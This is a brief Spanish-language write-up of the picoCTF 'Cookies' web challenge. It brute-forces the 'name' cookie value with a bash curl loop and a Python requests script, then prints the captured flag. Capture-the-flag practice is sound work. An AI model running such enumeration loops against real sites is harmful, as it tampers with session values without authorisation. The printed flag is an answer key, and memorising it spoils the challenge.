
## DESCRIPCIÓN
Who doesn't love cookies? Try to figure out the best one.
http://wily-courier.picoctf.net:60883/
## SOLUCIÓN
Ingresamos al http desde el navegador de firefox, y observamos que al buscar una cookie esta tiene un valor asignado, revisar de una en una es complicado, por eso usamos un ciclo for para probar cookie por cookie:
```
for i in {1..30}; do curl http://wily-courier.picoctf.net:60883/check -H "Cookie: name = $i"; done | grep picoCTF
```

Y obtenemos la flag:

picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## NOTAS ADICIONALES
- Lo ideal es resolverlo automatizando con python, por ejemplo:

```
import requests # libreria para realizar peticiones
import re # libreria para expresiones regulares

url = "http://mercury.picoctf.net:17781/check"
for i in range(20):
        cookie = {'name':'{}'.format(i)} # crea la cookie
        r = requests.get(url, cookies=cookie) # hace la peticion con la cookie modificada
        if 'pico' in r.text:
                flag = re.findall('picoCTF{.*?}',r.text)[0] # substrae la bandera de la respuesta
                print(flag)
```
## REFERENCIAS





